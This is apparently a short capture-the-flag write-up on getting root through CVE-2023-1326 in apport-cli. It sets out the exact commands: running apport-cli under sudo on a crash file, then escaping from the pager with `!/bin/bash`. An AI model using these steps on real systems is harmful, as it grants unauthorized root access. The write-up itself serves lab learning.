running `sudo -l` we find 
![[Pasted image 20231127032532.png]]

after looking online for that version and exploit we come across ubuntu security page
https://ubuntu.com/security/CVE-2023-1326
it talks about the exploit and also links a github page 
![[Pasted image 20231127040155.png]]

visiting the 
https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb page we find
![[Pasted image 20231127040232.png]]

lets cd to /var/crash to look for any crash file, at the time of writing this writup there was a crash file 
![[Pasted image 20231127040349.png]]

## privesc steps
- do `sudo /usr/bin/apport-cli  -c _usr_bin_sleep.1000.crash`
![[Pasted image 20231127040436.png]]
- select V (view report)
- wait for some time to see the `:` 
![[Pasted image 20231127040523.png]]

- now we do `!/bin/bash`
![[Pasted image 20231127040600.png]]
- we get root, you can find the /root/root.txt